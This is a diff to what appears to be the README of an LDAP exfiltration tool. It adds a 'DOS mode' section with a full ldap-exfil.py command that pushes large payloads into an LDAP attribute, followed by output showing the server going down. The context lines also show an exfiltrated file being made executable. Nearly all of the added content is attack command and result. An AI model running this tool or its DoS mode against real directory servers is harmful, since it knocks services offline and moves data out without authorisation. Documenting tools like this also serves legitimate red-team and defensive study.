@@ -90,7 +90,27 @@ $ file /tmp/exfil.data
 $ chmod +x /tmp/exfil.data
 ```
 
+**DOS mode:**
+```sh
+$ python ldap-exfil.py --server ldap://127.0.0.1:389 -d uid=lmis,cn=users,cn=accounts,dc=exfil,dc=int -a gecos -m dos --file -p 'password'
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+*** Size: [ 139810136 ] bytes
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
+('*** ERROR', SERVER_DOWN({'desc': "Can't contact LDAP server"},))
 
+```
 
 ### Contact
 
